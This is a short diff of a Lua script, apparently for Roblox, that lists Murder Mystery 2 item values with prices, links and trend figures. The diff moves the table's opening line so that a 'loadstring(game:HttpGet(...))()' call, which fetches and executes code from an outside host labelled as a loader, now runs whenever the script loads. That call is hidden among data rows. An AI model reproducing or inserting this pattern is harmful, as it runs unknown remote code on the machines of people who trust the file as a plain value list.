@@ -1,5 +1,6 @@
-local items = {
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImZmNjdmY2QzLWVkMTEtNDY0Ni1hOTM2LWYyMWI5OTI2OTlkYSIsImtpbmQiOiJsb2FkZXIifQ"))()
+
+local items = {
     {"ancients", "Batwing", "Batwing", "40", "https://supremevalues.com/mm2/ancients?item=Batwing", "Stable", "-2"},
     {"ancients", "Celestial", "Celestial", "1,950", "https://supremevalues.com/mm2/ancients?item=Celestial", "Stable", "-50"},
     {"ancients", "Elderwood Scythe", "Elderwood Scythe", "35", "https://supremevalues.com/mm2/ancients?item=Elderwood_Scythe", "Stable", "-3"},
